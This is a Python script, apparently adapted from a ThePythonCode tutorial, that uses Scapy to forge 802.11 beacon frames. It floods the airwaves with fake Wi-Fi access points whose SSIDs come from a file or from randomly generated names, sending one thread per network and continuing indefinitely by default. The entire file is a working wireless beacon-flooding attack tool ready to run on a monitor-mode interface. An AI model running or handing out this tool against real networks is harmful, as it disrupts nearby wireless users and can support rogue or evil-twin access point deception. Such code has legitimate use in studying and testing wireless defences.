from scapy.all import *
import argparse
from threading import Thread
from faker import Faker
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, RadioTap


# source code : https://www.thepythoncode.com/code/create-fake-access-points-scapy

def send_beacon(ssid, mac, count, interval):
    # type=0:       management frame
    # subtype=8:    beacon frame
    # addr1:        MAC address of the receiver
    # addr2:        MAC address of the sender
    # addr3:        MAC address of the Access Point (AP)

    # stack all the layers
    frame = RadioTap() / Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=mac, addr3=mac) / Dot11Beacon() / \
            Dot11Elt(ID="SSID", info=ssid, len=len(ssid))

    if count == 0:
        # if count is 0, it means we loop forever (until interrupt)
        loop = 1
        count = None
        print(f"\n[+] Sending beacons of network {ssid} every {interval}s forever...")
    else:
        loop = 0
        print(f"\n[+] Sending {count} beacons of network {ssid} every {interval}s...")

    # send the frame
    sendp(frame, inter=interval, count=count, loop=loop, iface=interface, verbose=1)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="A python script for flooding fake SSID")
    action = parser.add_mutually_exclusive_group(required=True)

    parser.add_argument("-i", dest="iface", help="Interface to use, must be in monitor mode, default is 'wlan0'",
                        default="wlan0")

    # user has to choose between using a SSID list in a file or generate n random SSID and cannot use both
    # (mutually exclusive group of arguments)
    action.add_argument("-f", "--ssid-file", dest="ap_list", help="File containing a list of SSID to create", )
    action.add_argument("-n", "--ssid-number", dest="n_ap", help="Number of random SSID to create")

    parser.add_argument("-c", "--count", help="Number of beacons to send per SSID, specify 0 to keep sending "
                                              "infinitely, default is 0", default=0)
    parser.add_argument("--interval",
                        help="The sending frequency (in seconds) between two frames sent, default is 0.1s",
                        default=0.1)
    args = parser.parse_args()

    interface = args.iface
    count = int(args.count)
    interval = float(args.interval)

    faker = Faker()

    # if user choose to generate n random SSID
    if args.n_ap:
        n_ap = int(args.n_ap)
        # Faker generates n random SSID with random MAC addresses
        ssids_macs = [(faker.name(), faker.mac_address()) for i in range(n_ap)]
        for ssid, mac in ssids_macs:
            # a thread is created for each generated SSID
            Thread(target=send_beacon, args=(ssid, mac, count, interval)).start()
    # else, user choose to use a list of SSID in a file
    else:
        i = 0
        # file is read line by line
        with open(args.ap_list) as ap_list_file:
            for line in ap_list_file:
                i += 1
                # a thread is created for each read line
                Thread(target=send_beacon, args=(line.strip(), faker.mac_address(), count, interval)).start()
